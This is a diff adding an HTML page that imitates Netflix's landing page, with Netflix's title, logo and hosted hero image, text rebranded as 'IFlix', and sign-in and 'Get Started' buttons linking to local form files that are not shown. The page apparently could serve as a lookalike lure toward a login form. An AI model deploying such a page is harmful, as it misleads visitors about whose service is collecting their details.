@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Netflix - Watch TV Shows Online, Watch Movies Online</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background-color: #141414;
+      color: #fff;
+    }
+    /* Custom scrollbar for FAQ */
+    .scrollbar-thin::-webkit-scrollbar {
+      width: 6px;
+    }
+    .scrollbar-thin::-webkit-scrollbar-thumb {
+      background-color: #555;
+      border-radius: 3px;
+    }
+  </style>
+</head>
+ <nav class="bg-black py-4 px-6">
+    <div class="flex justify-between items-center max-w-5xl mx-auto">
+      <div class="text-red text-lg font-bold">Netflix</div>
+      <a href="./iflixbackend-main/form.html" class="bg-red-600 hover:bg-red-700 transition-colors text-white font-semibold px-4 py-2 rounded">
+        Masuk
+      </a>
+    </div>
+  </nav>
+
+<body class="min-h-screen flex flex-col">
+
+  <!-- Hero Section -->
+  <section class="relative bg-black">
+    <img
+      src="https://assets.nflxext.com/ffe/siteui/vlv3/fa7be975-efc3-48c6-8188-f07fdd1aa476/web/US-en-20250428-TRIFECTA-perspective_faab2a97-6c57-47de-ba17-78563803a67b_large.jpg"
+      alt="Netflix Hero"
+      class="w-full h-[450px] object-cover brightness-50"
+    />
+    <div class="absolute inset-0 flex flex-col justify-center items-center text-center px-4">
+      <h1 class="text-4xl md:text-6xl font-extrabold mb-4">Unlimited movies, TV shows, and more</h1>
+      <p class="text-xl md:text-2xl mb-6">Starts at $7.99. Cancel anytime.</p>
+      <form class="w-full max-w-xl flex flex-col sm:flex-row gap-4 justify-center" onsubmit="event.preventDefault()">
+        <input
+          type="email"
+          placeholder="Email address"
+          required
+          class="flex-grow px-4 py-3 rounded text-black text-lg focus:outline-none"
+          aria-label="Email address"
+        />
+        <button
+          type="submit"
+          class="bg-red-600 hover:bg-red-700 transition-colors px-6 py-3 rounded text-lg font-semibold"
+          onclick="location.href='./numpang ali/form1.html'"
+        >
+          Get Started
+        </button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Pricing Section -->
+  <section class="bg-[#141414] py-12 px-4 text-center max-w-5xl mx-auto">
+    <h2 class="text-2xl md:text-3xl font-bold mb-4">The IFlix you love for just $7.99.</h2>
+    <p class="mb-6 text-gray-300">Get our most affordable, ad-supported plan.</p>
+    <a href="#" class="text-red-600 hover:underline font-semibold">Learn More</a>
+  </section>
+
+  
+
+  <!-- More Reasons to Join Section -->
+  <section class="bg-[#141414] py-12 px-4 max-w-5xl mx-auto space-y-8">
+    <h3 class="text-xl md:text-2xl font-bold mb-6">More Reasons to Join</h3>
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 text-gray-300">
+      <div class="flex items-start gap-4">
+        <i class="fas fa-tv fa-3x text-red-600"></i>
+        <div>
+          <h4 class="font-semibold text-lg mb-1">Enjoy on your TV</h4>
+          <p>Watch on Smart TVs, Playstation, Xbox, Chromecast, Apple TV, Blu-ray players, and more.</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-4">
+        <i class="fas fa-download fa-3x text-red-600"></i>
+        <div>
+          <h4 class="font-semibold text-lg mb-1">Download your shows to watch offline</h4>
+          <p>Save your favorites easily and always have something to watch.</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-4">
+        <i class="fas fa-globe fa-3x text-red-600"></i>
+        <div>
+          <h4 class="font-semibold text-lg mb-1">Watch everywhere</h4>
+          <p>Stream unlimited movies and TV shows on your phone, tablet, laptop, and TV.</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-4">
+        <i class="fas fa-child fa-3x text-red-600"></i>
+        <div>
+          <h4 class="font-semibold text-lg mb-1">Create profiles for kids</h4>
+          <p>Send kids on adventures with their favorite characters in a space made just for them — free with your membership.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ Section -->
+  <section class="bg-[#141414] py-12 px-4 max-w-5xl mx-auto">
+    <h3 class="text-xl md:text-2xl font-bold mb-6">Frequently Asked Questions</h3>
+    <div class="space-y-4 text-gray-300">
+      <details class="bg-gray-900 rounded p-4">
+        <summary class="cursor-pointer font-semibold text-lg">What is IFlix?</summary>
+        <p class="mt-2 text-sm leading-relaxed">
+          IFlix is a streaming service that offers a wide variety of award-winning TV shows, movies, anime, documentaries, and more on thousands of internet-connected devices.
+          You can watch as much as you want, whenever you want – all for one low monthly price. There's always something new to discover and new TV shows and movies are added every week!
+        </p>
+      </details>
+      <details class="bg-gray-900 rounded p-4">
+        <summary class="cursor-pointer font-semibold text-lg">How much does IFlix cost?</summary>
+        <p class="mt-2 text-sm leading-relaxed">
+          Watch IFlix on your smartphone, tablet, Smart TV, laptop, or streaming device, all for one fixed monthly fee. Plans range from $7.99 to $24.99 a month (pre-tax). No extra costs, no contracts.
+        </p>
+      </details>
+      <details class="bg-gray-900 rounded p-4">
+        <summary class="cursor-pointer font-semibold text-lg">Where can I watch?</summary>
+        <p class="mt-2 text-sm leading-relaxed">
+          Watch anywhere, anytime. Sign in with your IFlix account to watch instantly on the web at IFlix.com from your personal computer or on any internet-connected device that offers the IFlix app, including smart TVs, smartphones, tablets, streaming media players and game consoles.
+          You can also download your favorite shows with the iOS or Android app. Use downloads to watch while you're on the go and without an internet connection. Take IFlix with you anywhere.
+        </p>
+      </details>
+      <details class="bg-gray-900 rounded p-4">
+        <summary class="cursor-pointer font-semibold text-lg">How do I cancel?</summary>
+        <p class="mt-2 text-sm leading-relaxed">
+          IFlix is flexible. There are no pesky contracts and no commitments. You can easily cancel your account online in two clicks. There are no cancellation fees – start or stop your account anytime.
+        </p>
+      </details>
+      <details class="bg-gray-900 rounded p-4">
+        <summary class="cursor-pointer font-semibold text-lg">What can I watch on IFlix?</summary>
+        <p class="mt-2 text-sm leading-relaxed">
+          IFlix has an extensive library of feature films, documentaries, TV shows, anime, award-winning IFlix originals, and more. Watch as much as you want, anytime you want.
+        </p>
+      </details>
+      <details class="bg-gray-900 rounded p-4">
+        <summary class="cursor-pointer font-semibold text-lg">Is IFlix good for kids?</summary>
+        <p class="mt-2 text-sm leading-relaxed">
+          The IFlix Kids experience is included in your membership to give parents control while kids enjoy family-friendly TV shows and movies in their own space.
+          Kids profiles come with PIN-protected parental controls that let you restrict the maturity rating of content kids can watch and block specific titles you don’t want kids to see.
+        </p>
+      </details>
+    </div>
+  </section>
+
+  <!-- Email Call to Action Section -->
+  <section class="bg-black py-12 px-4 text-center max-w-5xl mx-auto">
+    <h3 class="text-2xl md:text-3xl font-bold mb-4">Ready to watch? Enter your email to create or restart your membership.</h3>
+    <form class="w-full max-w-xl mx-auto flex flex-col sm:flex-row gap-4 justify-center" onsubmit="event.preventDefault()">
+      <input
+        type="email"
+        placeholder="Email address"
+        required
+        class="flex-grow px-4 py-3 rounded text-black text-lg focus:outline-none"
+        aria-label="Email address"
+      />
+      <button
+        type="submit"
+        class="bg-red-600 hover:bg-red-700 transition-colors px-6 py-3 rounded text-lg font-semibold"
+      >
+        Get Started
+      </button>
+    </form>
+  </section>
+
+  <!-- Footer Section -->
+  <footer class="bg-[#141414] py-8 px-4 text-gray-400 text-sm max-w-5xl mx-auto">
+   
+    <div class="space-y-4 max-w-xl mx-auto ">
+      <h4 class="font-semibold text-white mb-2">Privacy Preference Center</h4>
+      <p><strong>General Description</strong></p>
+      <p class="mb-4">
+        This cookie tool will help you understand the use of cookies on the IFlix service, and how you can control the use of these cookies.
+        Privacy settings in most browsers allow you to prevent your browser from accepting some or all cookies, notify you when it receives a new cookie, or disable cookies altogether.
+        If your browser disables all cookies, then information will not be collected or stored via the cookies listed in this tool.
+        This means that your use of the IFlix service may be impaired.
+      </p>
+      <p><strong>Essential Cookies</strong></p>
+      <p class="mb-4">
+        These cookies are strictly necessary to provide the IFlix service. For example, we and our Service Providers may use these cookies to authenticate and identify users when they use our websites so we can provide our service to them.
+        They also help us to administer and operate our business; for safety, security and fraud prevention; and to comply with law and enforce our Terms of Use.
+        As these cookies are strictly necessary to provide our service, you cannot opt out of them.
+      </p>
+      <p><strong>First Party Performance and Functionality Cookies</strong></p>
+      <p class="mb-4">
+        These cookies help us to customize and enhance your online experience with the IFlix service.
+        For example, they help us to remember your preferences and prevent you from needing to re-enter information you previously provided (for example, during member sign up).
+        We also use these cookies to collect information (such as popular pages, conversion rates, viewing patterns, click-through and other information) about our visitors' use of the IFlix service so that we can provide our service and also to research, analyze and improve our services.
+        Deletion of these types of cookies may result in limited functionality of our service.
+      </p>
+      <p><strong>Third Party Performance and Functionality Cookies</strong></p>
+      <p class="mb-4">
+        These cookies, set by third parties, help us to customize and enhance your online experience with IFlix.
+        The cookies in this category are only set on Tudum (our official fandom site).
+        We use these cookies to provide you experiences hosted by third parties, like displaying social media content.
+        For further information on how these third parties use such cookies, please see the privacy information provided by the third party on their website.
+        Deletion of these types of cookies may result in limited functionality.
+      </p>
+      <p><strong>Advertising Cookies</strong></p>
+      <p>
+        These cookies collect information via the IFlix service in connection with “Advertisements” (as defined in our Terms of Use).
+        “Advertising Companies” (as defined in our Privacy Statement) may also collect information via these cookies in connection with Advertisements.
+        If you opt out of advertising cookies, you may still see Advertisements on the IFlix service but they will not be based on information collected from advertising cookies.
+      </p>
+    </div>
+  </footer>
+
+</body>
+</html>
